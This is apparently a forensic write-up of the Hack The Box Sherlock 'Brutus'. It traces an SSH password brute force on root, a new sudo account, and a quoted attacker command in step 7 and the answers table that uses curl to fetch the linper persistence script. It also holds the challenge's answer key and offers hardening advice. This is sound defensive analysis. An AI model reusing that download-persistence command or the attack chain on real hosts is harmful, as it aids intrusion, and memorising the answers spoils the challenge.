# Brutus (Hack The Box Sherlock)

## Summary

The server's `auth.log` and `wtmp` show an SSH password brute force from `65.2.161.68` that got the `root` password. The attacker then logged in by hand, created a local account `cyberjunkie`, added it to the `sudo` group, and used it to download a Linux persistence script with `curl`.

## Target and version

- Platform: Hack The Box, Sherlocks (DFIR), rated Very Easy
- Evidence: `auth.log`, `wtmp`, and the helper script `utmp.py` shipped with the Sherlock
- Host: a Confluence server (from the scenario text)
- Completed: not recorded

## Preconditions

Only the two log files. No live system is needed.

## Environment

Not recorded. Tools: GNU `grep`, `awk`, `sort`, `uniq`, and either `utmpdump` or the provided `utmp.py` (Python 3).

## Steps to reproduce

1. Count failed SSH logins per source IP:
   ```bash
   grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
   ```
   Expected: one IP far ahead of the rest. Actual: `65.2.161.68`, with hundreds of failures across many usernames in a few seconds.

2. Find successful logins:
   ```bash
   grep "Accepted password" auth.log
   ```
   Expected: a success from the same IP after the burst. Actual: `root` accepted from `65.2.161.68` twice. The first session closes at once (the brute-force tool checking the password). The second, about a minute later, is the attacker working by hand.

3. Get the time the interactive session started from `wtmp`:
   ```bash
   python3 utmp.py wtmp -o wtmp.out
   grep 65.2.161.68 wtmp.out
   ```
   Actual: `2024-03-06 06:32:45` (UTC). `auth.log` logs the authentication a second or so earlier, and the Sherlock asks for the `wtmp` time.

4. Get the session number:
   ```bash
   grep "New session" auth.log
   ```
   Actual: `systemd-logind` gave the manual root login session `37`.

5. Look for account changes:
   ```bash
   grep -E "useradd|usermod|groupadd" auth.log
   ```
   Actual: user `cyberjunkie` created, then added to group `sudo`.

6. Find when session 37 ended:
   ```bash
   grep "Removed session 37" auth.log
   ```
   Actual: `2024-03-06 06:37:24`.

7. List what `cyberjunkie` ran with sudo:
   ```bash
   grep "sudo:" auth.log | grep cyberjunkie
   ```
   Actual: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Answers

| Question | Answer |
|---|---|
| Attacker IP | `65.2.161.68` |
| Brute-forced account that worked | `root` |
| Manual login time (wtmp, UTC) | `2024-03-06 06:32:45` |
| Session number | `37` |
| Account created for persistence | `cyberjunkie` |
| MITRE sub-technique for that persistence | `T1136.001` |
| End of the first SSH session | `2024-03-06 06:37:24` |
| Full sudo command run by the new account | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

## Impact and limits

What the logs show: root access over SSH from one external IP, a new sudo-capable account, and a download command for `linper.sh`.

What they don't show: whether `linper.sh` was executed after the download, or what it installed. `auth.log` only records the `sudo curl` line. Answering that would need the shell history, the file system, or process logs, and none of those are in the evidence.

## MITRE ATT&CK

- T1110.001 Brute Force: Password Guessing
- T1078.003 Valid Accounts: Local Accounts
- T1136.001 Create Account: Local Account
- T1098 Account Manipulation (added to `sudo`)
- T1105 Ingress Tool Transfer

## Detection and fixes

- The brute force came from a single IP in a burst of seconds. `fail2ban` or a firewall rate limit on port 22 would have blocked it.
- The successful login was password-based and as `root`. Set `PasswordAuthentication no` and `PermitRootLogin no` in `sshd_config`.
- Remove `cyberjunkie`, check `/etc/sudoers` and `/etc/sudoers.d/`, and look for cron jobs, systemd units and `authorized_keys` entries, since linper installs persistence through those.
- Change the root password and any credentials stored on the Confluence server.

## Open items

- The times between 06:32:45 and 06:37:24 (account creation, the sudo group change, the `cyberjunkie` login, the `curl` command) are not in this report yet. Copy them from my own `auth.log` output.
- Paste the actual output lines for steps 1 to 7.
- Completion date.

## References

- Hack The Box Sherlocks: <https://app.hackthebox.com/sherlocks>
- linper: <https://github.com/montysecurity/linper>
- MITRE T1136.001: <https://attack.mitre.org/techniques/T1136/001/>
